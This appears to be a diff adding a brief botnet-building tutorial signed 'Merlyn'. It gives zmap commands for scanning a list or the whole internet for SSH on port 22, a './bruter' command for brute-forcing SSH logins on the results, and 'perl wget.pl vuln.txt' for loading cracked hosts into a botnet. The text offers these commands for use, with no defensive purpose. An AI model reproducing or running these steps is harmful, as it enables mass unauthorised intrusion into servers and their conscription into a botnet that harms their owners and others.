@@ -1,0 +1,21 @@
+[SSH Scan Tutorial By Merlyn]
+
+First you want to ZMAP a region or the world.
+
+[List Scanning]
+Zmap -p22 -w LIST.lst -o mfu.txt
+
+[World Scanning]
+Zmap -p22 -o mfu.txt
+
+Once your scan is complete run your bruter file.
+for most skids its ./update, however in mine you'll fine a more advanced one called ./bruter
+so now brute your bots.
+
+[Brute Command]
+./bruter mfu.txt [port] 1500
+
+now that you have bruted a list of vulns, scan them to your botnet with your perl file.
+
+[Load Command]
+perl wget.pl vuln.txt
